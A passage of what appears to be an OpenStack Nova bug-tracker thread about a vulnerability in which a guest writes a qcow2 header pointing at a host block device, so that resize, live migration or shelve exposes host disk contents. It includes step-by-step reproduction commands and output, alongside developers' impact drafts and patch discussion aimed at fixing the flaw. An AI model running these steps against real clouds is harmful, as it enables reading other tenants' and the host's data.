virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on
- Confirm the block layout within the guest and umount the formatted ephemeral disk :
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 1G 0 disk /mnt
root@guest # umount /mnt
- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :
root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backing\_fmt=raw /dev/vdb 20G
Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing\_file='/dev/sda3' backing\_fmt='raw' encryption=off cluster\_size=65536 lazy\_refcounts=off refcount\_bits=16
root@guest # qemu-img info /dev/vdb
image: /dev/vdb
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 0
cluster\_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
refcount bits: 16
corrupt: false
- Now request a resize of the instance :
# nova resize d56b9bf3-f3b0-4d76-952b-5015b43babcd 7
- Once complete confirm the qemu-kvm command line used to launch the instance, note the qcow2 format for the ephemeral disk :
root@host # ps aux | grep qemu
qemu 20762 99.8 5.5 1859748 436596 ? Rl 14:11 0:22 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 768 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=599d7700-3d4b-1543-8882-f4ec4901c043,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on
- Again within the guest confirm the block layout, note that there is now a 20G device mounted under /mnt :
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 20G 0 disk /mnt
- As we have full access to the block device we can gain access not only to files on the host but potentially other instances as well :
root@guest # cat /mnt/etc/redhat-release
Red Hat Enterprise Linux Server release 7.2 (Maipo)
root@guest # qemu-img info /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0
image: /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 1.0G
cluster\_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
refcount bits: 16
corrupt: false
root@host # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda 8:0 0 20G 0 disk
├─sda1 8:1 0 512M 0 part /boot
├─sda2 8:2 0 1G 0 part [SWAP]
└─sda3 8:3 0 18.5G 0 part /

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-23: |  |  | [#8](/nova/%2Bbug/1548450/comments/8) |
| --- | --- | --- | --- |

Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I've confirmed the OSSA task and raises its priority accordingly...

Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I've confirmed the OSSA task and raises its priority accordingly...

| Changed in nova: | |
| --- | --- |
| **status**: | New → Confirmed |
| Changed in ossa: | |
| **status**: | Incomplete → Confirmed |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-23: |  |  | [#9](/nova/%2Bbug/1548450/comments/9) |
| --- | --- | --- | --- |

Impact description draft #1 (assuming write access):

Title: Nova host data access through resize/migration

Reporter: Matthew Booth (Red Hat)

Products: Nova

Affects: <=2015.1.2, >=12.0.0 <=12.0.1

Description:

Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting "use\_cow\_images = False" (not default) are affected.

Impact description draft #1 (assuming write access):
Title: Nova host data access through resize/migration
Reporter: Matthew Booth (Red Hat)
Products: Nova
Affects: <=2015.1.2, >=12.0.0 <=12.0.1
Description:
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting "use\_cow\_images = False" (not default) are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-23: |  |  | [#10](/nova/%2Bbug/1548450/comments/10) |
| --- | --- | --- | --- |

Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note.

Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-23: |  |  | [#11](/nova/%2Bbug/1548450/comments/11) |
| --- | --- | --- | --- |

No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.

Impact description draft #2:

Title: Nova host data leak through resize/migration

Reporter: Matthew Booth (Red Hat)

Products: Nova

Affects: <=2015.1.2, >=12.0.0 <=12.0.1

Description:

Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting "use\_cow\_images = False" (not default) are affected.

No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.
Impact description draft #2:
Title: Nova host data leak through resize/migration
Reporter: Matthew Booth (Red Hat)
Products: Nova
Affects: <=2015.1.2, >=12.0.0 <=12.0.1
Description:
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting "use\_cow\_images = False" (not default) are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-24: |  |  | [#12](/nova/%2Bbug/1548450/comments/12) |
| --- | --- | --- | --- |

Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don't copy over disk.info, it's possible that a live migration followed by a reboot could result in the same vulnerability. Lee's looking into this.

Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don't copy over disk.info, it's possible that a live migration followed by a reboot could result in the same vulnerability. Lee's looking into this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-24: |  |  | [#13](/nova/%2Bbug/1548450/comments/13) |
| --- | --- | --- | --- |

At first glance, I think live migration is vulnerable. pre\_live\_migration runs on the destination host, and runs \_create\_images\_and\_backing() without having copied over disk.info. \_create\_images\_and\_backing is passed disk\_info (not to be confused with disk.info) which was originally generated by libvirt.get\_instance\_disk\_info on the source host. This disk\_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.

If the user reboots, \_hard\_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt.\_get\_guest\_disk\_config for the ephemeral disk. This calls imagebackend.image(), which instantiates a Raw object. That instantiation calls correct\_format(), which calls resolve\_driver\_format(), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.

Long story short: pre\_live\_migration should probably also copy disk.info.

At first glance, I think live migration is vulnerable. pre\_live\_migration runs on the destination host, and runs \_create\_images\_and\_backing() without having copied over disk.info. \_create\_images\_and\_backing is passed disk\_info (not to be confused with disk.info) which was originally generated by libvirt.get\_instance\_disk\_info on the source host. This disk\_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.
If the user reboots, \_hard\_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt.\_get\_guest\_disk\_config for the ephemeral disk. This calls imagebackend.image(), which instantiates a Raw object. That instantiation calls correct\_format(), which calls resolve\_driver\_format(), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.
Long story short: pre\_live\_migration should probably also copy disk.info.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-24: |  |  | [#14](/nova/%2Bbug/1548450/comments/14) |
| --- | --- | --- | --- |

I've reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :

root@source # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info

{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "raw"}

root@guest # lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 1G 0 disk /mnt

root@guest # umount /mnt

root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backing\_fmt=raw /dev/vdb 20G

Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing\_file='/dev/sda3' backing\_fmt='raw' encryption=off cluster\_size=65536 lazy\_refcounts=off refcount\_bits=16

[root@test-live-migrate ~]# lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 1G 0 disk

root@guest # qemu-img info /dev/vdb

image: /dev/vdb

file format: qcow2

virtual size: 20G (21474836480 bytes)

disk size: 0

cluster\_size: 65536

backing file: /dev/sda3

backing file format: raw

Format specific information:

    compat: 1.1

    lazy refcounts: false

    refcount bits: 16

    corrupt: false

# nova live-migration --block-migrate test-live-migrate

root@destination # ps aux | grep qemu

qemu 17656 10.6 3.3 1236024 262832 ? Sl 09:20 0:09 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none [..]

root@destination # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info

{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "qcow2"}

# nova reboot --hard test-live-migrate

root@destination # ps aux | grep qemu

qemu 18684 101 4.1 1209396 326928 ? Sl 09:23 0:11 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none [..]

root@guest # lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 20G 0 disk /mnt

root@guest # ll /mnt/etc/redhat-release

-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/redhat-release

I've reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :
root@source # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info
{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "raw"}
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 1G 0 disk /mnt
root@guest # umount /mnt
root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backing\_fmt=raw /dev/vdb 20G
Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing\_file='/dev/sda3' backing\_fmt='raw' encryption=off cluster\_size=65536 lazy\_refcounts=off refcount\_bits=16
[root@test-live-migrate ~]# lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 1G 0 disk
root@guest # qemu-img info /dev/vdb
image: /dev/vdb
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 0
cluster\_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
refcount bits: 16
corrupt: false
# nova live-migration --block-migrate test-live-migrate
root@destination # ps aux | grep qemu
qemu 17656 10.6 3.3 1236024 262832 ? Sl 09:20 0:09 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none [..]
root@destination # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info
{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "qcow2"}
# nova reboot --hard test-live-migrate
root@destination # ps aux | grep qemu
qemu 18684 101 4.1 1209396 326928 ? Sl 09:23 0:11 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none [..]
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 20G 0 disk /mnt
root@guest # ll /mnt/etc/redhat-release
-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/redhat-release

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-24: |  |  | [#15](/nova/%2Bbug/1548450/comments/15) |
| --- | --- | --- | --- |

The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...

Lee, any chance you try the hard-reboot case as described in comment #13 ?

To sum-up, the disk info needs to be copied in pre\_live\_migration, migrate\_disk\_and\_power\_off and \_hard\_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?

The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...
Lee, any chance you try the hard-reboot case as described in comment #13 ?
To sum-up, the disk info needs to be copied in pre\_live\_migration, migrate\_disk\_and\_power\_off and \_hard\_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Daniel Berrange (berrange)](https://launchpad.net/~berrange) wrote on 2016-02-25: |  |  | [#16](/nova/%2Bbug/1548450/comments/16) |
| --- | --- | --- | --- |

We don't need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM.

We don't need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-25: |  |  | [#17](/nova/%2Bbug/1548450/comments/17) |
| --- | --- | --- | --- |

Lee has a patch which reconstructs it from the confusingly similar disk\_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they're not relevant here and fixing this issue takes precedence. Hopefully Lee's patch will be ready for sharing later today.

Lee has a patch which reconstructs it from the confusingly similar disk\_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they're not relevant here and fixing this issue takes precedence. Hopefully Lee's patch will be ready for sharing later today.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-25: |  |  | [#18](/nova/%2Bbug/1548450/comments/18) |
| --- | --- | --- | --- |

Tristan, just to be clear the --hard reboot case described in c#13 is \_after\_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.

Tristan, just to be clear the --hard reboot case described in c#13 is \_after\_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-25: |  |  | [#19](/nova/%2Bbug/1548450/comments/19) |
| --- | --- | --- | --- |

Thank for the quick patch, I'm currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.

Thank for the quick patch, I'm currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-25: |  |  | [#20](/nova/%2Bbug/1548450/comments/20) |
| --- | --- | --- | --- |

On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.

Alternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.

On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.
Alternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2016-02-25: |  |  | [#21](/nova/%2Bbug/1548450/comments/21) |
| --- | --- | --- | --- |

I'm good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...

Talking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we're on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.

In general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can't understand it. However, I think we probably already have that case if we're on shared storage, where the file lives in a shared-by-both location. That's a time bomb waiting to go off, but we'll just have to deal with it when it happens I guess.

I'm good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...
Talking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we're on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.
In general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can't understand it. However, I think we probably already have that case if we're on shared storage, where the file lives in a shared-by-both location. That's a time bomb waiting to go off, but we'll just have to deal with it when it happens I guess.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-25: |  |  | [#22](/nova/%2Bbug/1548450/comments/22) |
| --- | --- | --- | --- |

Apologies for the confusion Dan, the cold case doesn't overwrite the disk.info file as we've moved the inst\_base to inst\_base + '\_resize' before copying only the images back into inst\_base. inst\_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn't exist in the new directory. Again apologies for the confusion.

Apologies for the confusion Dan, the cold case doesn't overwrite the disk.info file as we've moved the inst\_base to inst\_base + '\_resize' before copying only the images back into inst\_base. inst\_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn't exist in the new directory. Again apologies for the confusion.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sean Dague (sdague)](https://launchpad.net/~sdague) wrote on 2016-02-25: |  |  | [#23](/nova/%2Bbug/1548450/comments/23) |
| --- | --- | --- | --- |

It seems like backing\_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we'll do this drill all over again.

How hard would it be to cut off that case entirely?

It seems like backing\_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we'll do this drill all over again.
How hard would it be to cut off that case entirely?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-02-25: |  |  | [#24](/nova/%2Bbug/1548450/comments/24) |
| --- | --- | --- | --- |

I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I'm fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.

I also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it's copied around.

I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I'm fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.
I also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it's copied around.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-25: |  |  | [#25](/nova/%2Bbug/1548450/comments/25) |
| --- | --- | --- | --- |

Sean, come talk to me at summit. We'll get along just fine :)

Seriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don't want to be using ext3 any more for ephemeral disks. It's problematic for more reasons than just security: [https://bugs.launchpad.net/nova/+bug/1547582](https://bugs.launchpad.net/nova/%2Bbug/1547582) .

My libvirt storage pools series is a huge cleanup in this area, and I'm not done yet. It's how I discovered both this CVE and the one from last month.

Sean, come talk to me at summit. We'll get along just fine :)
Seriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don't want to be using ext3 any more for ephemeral disks. It's problematic for more reasons than just security: https://bugs.launchpad.net/nova/+bug/1547582 .
My libvirt storage pools series is a huge cleanup in this area, and I'm not done yet. It's how I discovered both this CVE and the one from last month.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Daniel Berrange (berrange)](https://launchpad.net/~berrange) wrote on 2016-02-25: |  |  | [#26](/nova/%2Bbug/1548450/comments/26) |
| --- | --- | --- | --- |

Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that is pretty much is always unsafe. I'm fine with that being a patch we do later though.

The patch from Lee looks reasonable to me.

Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that is pretty much is always unsafe. I'm fine with that being a patch we do later though.
The patch from Lee looks reasonable to me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-25: |  |  | [#27](/nova/%2Bbug/1548450/comments/27) |
| --- | --- | --- | --- |

Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I've not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I'll look into this tomorrow morning.

Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I've not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I'll look into this tomorrow morning.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-25: |  |  | [#28](/nova/%2Bbug/1548450/comments/28) |
| --- | --- | --- | --- |

I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.

I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-25: |  |  | [#29](/nova/%2Bbug/1548450/comments/29) |
| --- | --- | --- | --- |

It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn't work with ephemeral disk and by default nova doesn't allow resize on the same host... Finally the patch doesn't apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/python2.7/site-packages/nova using "patch -p2":

patching file virt/libvirt/driver.py

Hunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).

Hunk #2 FAILED at 7195.

The failed hunk contains unresolved symbols: on\_execute, on\_completion and compression that needs to be removed.

It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn't work with ephemeral disk and by default nova doesn't allow resize on the same host... Finally the patch doesn't apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/python2.7/site-packages/nova using "patch -p2":
patching file virt/libvirt/driver.py
Hunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).
Hunk #2 FAILED at 7195.
The failed hunk contains unresolved symbols: on\_execute, on\_completion and compression that needs to be removed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-26: |  |  | [#30](/nova/%2Bbug/1548450/comments/30) |
| --- | --- | --- | --- |

And it seems like the shelve issue is real and not fixed by the propose patch.

After overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:

7084 ? Ssl 1:05 /usr/bin/python /usr/bin/nova-compute

11792 ? Sl 2:40 \\_ qemu-img convert -f qcow2 -O qcow2 \

  /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk \

  /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

